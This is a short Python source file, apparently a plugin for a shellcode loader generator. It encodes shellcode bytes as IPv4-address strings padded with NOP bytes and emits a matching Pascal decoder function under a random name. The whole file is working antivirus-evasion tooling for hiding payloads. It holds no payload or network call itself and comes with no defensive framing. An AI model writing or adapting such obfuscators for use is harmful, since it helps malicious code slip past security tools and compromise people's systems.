import random
import string

class IPv4Obfuscate:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []

    def obfuscate(self, decoded: bytes) -> list[str]:
        encoded = []
        self.size = 0
        self.decodedLength = len(decoded)
        for i in range(0, len(decoded), 4):
            chunk = decoded[i:i+4]
            if len(chunk) < 4:
                chunk = chunk + (b"\x90" * (4 - len(chunk)))
            encoded.append('.'.join([f'{chunk[n]}' for n in range(0, 4)]))
            self.size += 1
        return encoded

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')

    def codeblock(self) -> str:
        return f"""
function {self.name}(encoded: TStringArray): TBytes;
var
    i: Integer;
    address: String;
    octets: TStringArray;
    decoded: TBytes;
    j: Integer;
begin

    SetLength(decoded, {self.size*4});
    for i:= Low(encoded) To High(encoded) do
    begin
        address := encoded[i];
        octets := address.Split(['.']);
        for j := Low(octets) To High(octets) do
        begin
            decoded[i*4+j] := StrToInt(octets[j]);
        end;
    end;
    Result := Copy(decoded, 0, {self.decodedLength});
end;
"""